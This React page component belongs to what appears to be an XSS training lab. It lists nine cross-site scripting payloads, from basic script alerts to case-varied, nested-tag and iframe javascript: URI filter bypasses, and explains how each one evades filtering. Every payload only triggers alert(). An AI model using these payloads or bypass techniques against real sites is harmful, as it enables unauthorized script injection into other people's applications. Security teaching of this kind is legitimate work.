/**
 * PayloadLab.jsx — XSS Payload Bank & Test Lab
 * ===============================================
 * Part of Phase 6: XSS Learning Lab Platform.
 * Displays example inputs for educational testing inside the local lab.
 *
 * Location: src/pages/PayloadLab.jsx
 */

import { useState } from "react";
import toast from "react-hot-toast";
import { HiShieldExclamation, HiFire, HiBadgeCheck } from "react-icons/hi";
import { FaLaptopCode } from "react-icons/fa";

const PayloadLab = () => {
  const [activeTab, setActiveTab] = useState("beginner");

  const payloads = {
    beginner: [
      {
        id: "b1",
        label: "HTML Injection",
        code: `<b>Bold Tag Test</b>`,
        xssType: "Reflected, Stored, DOM Based XSS",
        purpose: "Verifies if the application filters HTML brackets. By wrapping input in <b> tags, if the output displays bold text, it proves the browser is parsing user-supplied HTML.",
        expectedBehavior: "The text 'Bold Tag Test' is displayed in bold formatting. No popup occurs.",
        difficulty: "Beginner"
      },
      {
        id: "b2",
        label: "Basic Alert script",
        code: `<script>alert('XSS!')</script>`,
        xssType: "Reflected, Stored XSS",
        purpose: "The most classic payload. If the application outputs this tag raw, the browser immediately parses and runs the Javascript alert pop-up.",
        expectedBehavior: "An alert dialog box pops up saying 'XSS!'.",
        difficulty: "Beginner"
      },
      {
        id: "b3",
        label: "Image onerror execution",
        code: `<img src=x onerror="alert('XSS!')">`,
        xssType: "Reflected, Stored, DOM Based XSS",
        purpose: "Bypasses standard script filters. Browsers attempt to load an invalid image source 'x', which triggers the 'onerror' event handler and runs the JS payload.",
        expectedBehavior: "An alert box appears when the image element fails to load.",
        difficulty: "Beginner"
      }
    ],
    intermediate: [
      {
        id: "i1",
        label: "Event Handler on focus",
        code: `<input autofocus onfocus="alert('XSS!')">`,
        xssType: "Reflected, Stored XSS",
        purpose: "Bypasses simple script and image tags blocks. The 'autofocus' attribute immediately gives focus to the input box upon rendering, which triggers the 'onfocus' execution.",
        expectedBehavior: "An input box is inserted, and an alert box appears immediately upon page rendering.",
        difficulty: "Intermediate"
      },
      {
        id: "i2",
        label: "HTML5 SVG Payload",
        code: `<svg onload="alert('XSS!')">`,
        xssType: "Reflected, Stored XSS",
        purpose: "SVG tags load in modern HTML contexts. The onload event of the SVG executes automatically as soon as the element is loaded by the browser.",
        expectedBehavior: "An alert dialog fires immediately.",
        difficulty: "Intermediate"
      },
      {
        id: "i3",
        label: "Script on load event",
        code: `<body onload="alert('XSS!')">`,
        xssType: "Reflected XSS",
        purpose: "Injects code into existing document body tags if the application echoes text inside attributes or early in the document body structure.",
        expectedBehavior: "Alert dialog fires after the page completes rendering.",
        difficulty: "Intermediate"
      }
    ],
    advanced: [
      {
        id: "a1",
        label: "Bypassing casing filters",
        code: `<sCrIpt>alert('XSS!')</sCrIpt>`,
        xssType: "Reflected, Stored XSS",
        purpose: "Bypasses naive server filters that only scan for lowercase '<script>' strings.",
        expectedBehavior: "The script runs and triggers the alert dialog because HTML is case-insensitive.",
        difficulty: "Advanced"
      },
      {
        id: "a2",
        label: "Nested script markup injection",
        code: `<scr<script>ipt>alert('XSS!')</script>`,
        xssType: "Reflected, Stored XSS",
        purpose: "Exploits poor recursive stripping filters. If the server does a single search-and-replace for '<script>', it strips the middle tag, which merges the outer parts into a valid `<script>` tag.",
        expectedBehavior: "Alert dialog fires after server-side stripping runs.",
        difficulty: "Advanced"
      },
      {
        id: "a3",
        label: "IFrame javascript source URI",
        code: `<iframe src="javascript:alert('XSS!')"></iframe>`,
        xssType: "Reflected, Stored, DOM Based XSS",
        purpose: "Uses protocol-based injection. If script tags are blocked, executing scripts inside an iframe's source URL is a viable option.",
        expectedBehavior: "An iframe loads, and the script executes within the iframe context.",
        difficulty: "Advanced"
      }
    ]
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success("Payload copied to clipboard!");
  };

  return (
    <div className="pay-page animate-fade-in">
      {/* Header */}
      <header className="pay-header">
        <div className="pay-header__inner">
          <div className="pay-header__icon">
            <FaLaptopCode />
          </div>
          <div>
            <h1 className="pay-header__title">Payload Bank</h1>
            <p className="pay-header__subtitle">
              Interactive database of XSS payloads categorized by complexity
            </p>
          </div>
        </div>
      </header>

      {/* Warning callout */}
      <section className="pay-warning-banner">
        <HiShieldExclamation className="pay-warning-banner__icon" />
        <div>
          <strong>Strict Educational Warning</strong>
          <p>
            These payload examples are provided <strong>strictly for local testing</strong> inside the
            vulnerable panels of this project. Attempting to run XSS payloads on unauthorised public or private
            web systems is a severe security violation and is illegal under cybersecurity laws. Keep your testing local!
          </p>
        </div>
      </section>

      {/* Tab Selectors */}
      <div className="pay-tabs">
        {["beginner", "intermediate", "advanced"].map((tab) => (
          <button
            key={tab}
            className={`pay-tab pay-tab--${tab} ${activeTab === tab ? "pay-tab--active" : ""}`}
            onClick={() => setActiveTab(tab)}
          >
            {tab.charAt(0).toUpperCase() + tab.slice(1)}
          </button>
        ))}
      </div>

      {/* Payloads List */}
      <section className="pay-list-grid">
        {payloads[activeTab].map((item) => (
          <article key={item.id} className={`pay-card pay-card--${activeTab}`}>
            <div className="pay-card__header">
              <h3 className="pay-card__title">{item.label}</h3>
              <span className={`pay-badge pay-badge--${activeTab}`}>{item.difficulty}</span>
            </div>

            {/* Code Copy block */}
            <div className="pay-card__code-section">
              <code>{item.code}</code>
              <button
                type="button"
                className="pay-card__copy-btn"
                onClick={() => copyToClipboard(item.code)}
                title="Copy Payload"
              >
                Copy
              </button>
            </div>

            {/* Details */}
            <div className="pay-card__details">
              <div className="pay-card__detail-item">
                <strong>Related XSS Type:</strong>
                <span>{item.xssType}</span>
              </div>
              <div className="pay-card__detail-item">
                <strong>Exploit Purpose:</strong>
                <p>{item.purpose}</p>
              </div>
              <div className="pay-card__detail-item">
                <strong>Expected Behaviour:</strong>
                <p>{item.expectedBehavior}</p>
              </div>
            </div>
          </article>
        ))}
      </section>
    </div>
  );
};

export default PayloadLab;
